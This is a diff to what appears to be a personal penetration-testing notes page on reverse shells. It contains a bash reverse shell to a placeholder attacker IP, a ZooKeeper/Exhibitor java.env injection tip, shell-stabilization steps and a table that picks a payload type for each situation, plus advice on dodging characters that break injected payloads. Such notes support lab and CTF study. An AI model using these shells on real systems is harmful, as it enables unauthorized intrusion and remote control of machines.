@@ -30,6 +30,49 @@ export JAVA_OPTS="-Xms1000m -Xmx1000m"
 /bin/bash -i >& /dev/tcp/<KALI_IP>/<PORT> 0>&1
 ```
 
+> The `export JAVA_OPTS` line is **required** — it keeps ZooKeeper's JVM memory settings intact so the service doesn't crash on restart. Without it, the Java process fails and your shell never connects. The reverse shell on the second line runs alongside it.
+> See [[Exhibitor-ZooKeeper-RCE-to-Root]] for the full attack chain.
+
+---
+
+## Stabilize Your Shell (Linux)
+
+A raw reverse shell has no tab completion, no arrow keys, and `Ctrl+C` kills it. Stabilize it immediately. **Run each step one at a time — do not paste as a block.**
+
+```bash
+# 1. Spawn a proper TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 2. Background it (keypress — cannot be pasted)
+Ctrl+Z
+
+# 3. Fix your terminal settings
+stty raw -echo; fg
+
+# 4. Set terminal type
+export TERM=xterm
+```
+
+---
+
+## Which Shell to Use — Quick Decision
+
+| Situation | Use |
+|---|---|
+| Linux box, general | Bash |
+| Python app running / no bash | Python |
+| Payload injected via exploit script / POST body | Hosted script (curl pipe bash) |
+| Can't host a file, special chars still breaking payload | Base64 encoded bash |
+| Web app with code exec / file upload | PHP |
+| Windows box | PowerShell |
+| Netcat available, no `-e` flag | mkfifo |
+| Nothing else works | Perl |
+| Exhibitor/ZooKeeper UI exposed | java.env injection |
+
+**Why bash and python fail in exploit injection contexts:**
+- Bash contains `>&` and `0>&1` — the `&` breaks URL-encoded POST bodies (`&` = parameter separator)
+- Python contains double quotes `"` — breaks `os.system("...")` wrappers that many exploits use
+- Hosted script and base64 methods avoid all of these characters entirely
 ---
 
 ## Related Notes
